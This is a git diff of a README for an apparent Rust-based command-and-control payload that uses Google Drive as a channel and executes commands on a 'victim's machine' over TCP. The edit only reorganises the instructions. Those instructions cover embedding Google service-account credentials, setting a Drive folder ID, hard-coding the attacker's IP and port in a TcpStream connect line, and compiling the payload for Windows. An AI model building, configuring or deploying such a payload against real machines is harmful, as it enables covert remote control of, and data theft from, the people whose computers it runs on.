@@ -8,18 +8,8 @@ This project provides a Command and Control (C2) system using the Google Drive A
 - Command execution on the victim's machine through a TCP connection
 - Works with a Google Service Account for authentication
 # Prerequisites
-Google Service Account: You need to create a Google Cloud project, enable the Google Drive API, and download the Service Account credentials (JSON).
-Rust Toolchain: Ensure you have Rust installed. If not, install it from Rust's official site.
-How to Use
-1. Setup
-Add the Google Service Account JSON file to the src/ directory of the Rust project (used in main.rs).
-Update main.rs with your Google Drive folder ID.
-2. Compiling the Rust Payload
-Before compiling, on src/main.rs in payload folder, change this:
-- folder ID on ``` const FOLDER_ID: &str = "INPUT YOUR GGDRIVE ID"; ```
-- drop your json file in /src and put your json name in ```let service_account_json = include_str!("yourjsonfilename.json");```
-- your attacker's machine ip + port number at ```let mut stream = TcpStream::connect("192.168.247.131:4444").expect("Failed to connect");```
-
+- Google Service Account: You need to create a Google Cloud project, enable the Google Drive API, and download the Service Account credentials (JSON).
+- Rust Toolchain: Ensure you have Rust installed. If not, install it from Rust's official site.
 ## Dependencies 📦
 
 This Rust project relies on the following dependencies:
@@ -49,9 +39,20 @@ Make sure to install these by running:
 ```
 cargo build
 ```
+# How to use Rust payload?
+1. Setup:
+- Place the Google Service Account JSON file in the src/ directory of the Rust project (used in main.rs).
+- Update main.rs with your Google Drive folder ID.
+2. Compiling the Rust Payload
+Before compiling, in src/main.rs (in ```payload``` folder), modify this:
+- Set your Google Drive folder ID in ``` const FOLDER_ID: &str = "INPUT YOUR GGDRIVE ID"; ```
+- Place your JSON file in /src and update the file name in ```let service_account_json = include_str!("yourjsonfilename.json");```
+- Replace your attacker's machine ip + port number at ```let mut stream = TcpStream::connect("192.168.247.131:4444").expect("Failed to connect");```
+
 # Compiling Rust payload
 To compile the Rust payload, follow these steps:
 ```
+cd payload
 # Build for a Windows target
 cargo build --target x86_64-pc-windows-gnu --release
 ```
